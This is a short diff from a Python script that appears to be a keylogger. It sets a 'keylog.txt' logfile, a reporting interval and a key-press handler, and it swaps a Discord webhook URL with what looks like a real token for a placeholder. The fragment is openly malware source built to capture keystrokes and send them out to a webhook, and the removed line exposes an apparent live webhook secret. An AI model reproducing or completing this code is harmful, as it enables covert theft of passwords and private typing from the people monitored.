@@ -7,7 +7,7 @@ import os
 word = ""
 interval = 10
 logfile = "keylog.txt"
-webhook_url = "https://discord.com/api/webhooks/1205885490520     IixZIvjPRr4rxIRonxlpxCDNcw3bwVTSbzOcyNPwwBgpDN8WW4"
+webhook_url = "https://discord.com/api/webhooks/giriniz..."
 
 def on_press(key):
     global word
